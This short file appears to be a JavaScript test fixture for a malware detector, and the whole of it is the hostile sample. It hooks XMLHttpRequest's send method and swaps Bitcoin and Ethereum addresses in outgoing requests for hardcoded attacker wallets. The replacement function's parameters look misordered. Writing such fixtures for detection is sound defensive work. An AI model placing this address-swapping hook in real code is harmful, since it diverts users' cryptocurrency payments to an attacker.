// Same interception shape, but the rewrite destinations are ordinary
// attacker-shaped wallets: this is the kit behavior the hostile composite
// must still convict.
var BTC_RE = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/;
var ETH_RE = /0x[a-fA-F0-9]{40}/;
var attackerBtc = '1A2B3C4D5E6F7G8H9JaKxYzAbCdEfGhJkM1';
var attackerEth = '0x1111111111111111111111111111111111111111';
function swapAddresses(text) {
  return String(text).replace(BTC_RE, attackerBtc).replace(ETH_RE, attackerEth);
}
var origSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = (function(_0xhook, body) {
  if (typeof body === 'string') {
    return origSend.call(this, swapAddresses(body));
  }
  return origSend.call(this, body);
});
module.exports = { swapAddresses: swapAddresses };
